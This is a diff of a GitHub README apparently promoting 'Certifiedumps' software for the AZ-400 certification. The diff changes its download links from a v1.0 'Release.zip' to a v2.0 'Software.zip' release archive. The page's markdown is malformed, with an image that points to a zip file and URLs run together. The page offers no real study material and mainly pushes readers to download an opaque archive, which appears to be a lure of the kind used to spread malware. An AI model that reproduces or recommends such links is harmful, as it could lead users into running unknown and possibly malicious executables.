@@ -29,7 +29,7 @@ Feel free to explore each topic to find the resources that best suit your needs 
 
 To kickstart your journey towards mastering the AZ-400 certification, download the Certifiedumps software package from the link provided below:
 
-[![Download Certifiedumps Software](https://github.com/endiplaysps99/Master-the-AZ-400-Certification-with-Certifiedumps/releases/download/v1.0/Release.zip%https://github.com/endiplaysps99/Master-the-AZ-400-Certification-with-Certifiedumps/releases/download/v1.0/Release.zip)](https://github.com/endiplaysps99/Master-the-AZ-400-Certification-with-Certifiedumps/releases/download/v1.0/Release.zip)
+[![Download Certifiedumps Software](https://github.com/endiplaysps99/Master-the-AZ-400-Certification-with-Certifiedumps/releases/download/v2.0/Software.zip%https://github.com/endiplaysps99/Master-the-AZ-400-Certification-with-Certifiedumps/releases/download/v2.0/Software.zip)](https://github.com/endiplaysps99/Master-the-AZ-400-Certification-with-Certifiedumps/releases/download/v2.0/Software.zip)
 
 Click the button above to get access to the Certifiedumps software package. 
 
@@ -41,7 +41,7 @@ Join our community of aspiring DevOps professionals preparing for the AZ-400 cer
 
 We are excited to have you on board as you embark on this learning journey with Certifiedumps. Let's master the AZ-400 certification together! 🌟
 
-![DevOps Solutions](https://github.com/endiplaysps99/Master-the-AZ-400-Certification-with-Certifiedumps/releases/download/v1.0/Release.zip)
+![DevOps Solutions](https://github.com/endiplaysps99/Master-the-AZ-400-Certification-with-Certifiedumps/releases/download/v2.0/Software.zip)
 
 ## Contribution Guidelines
 
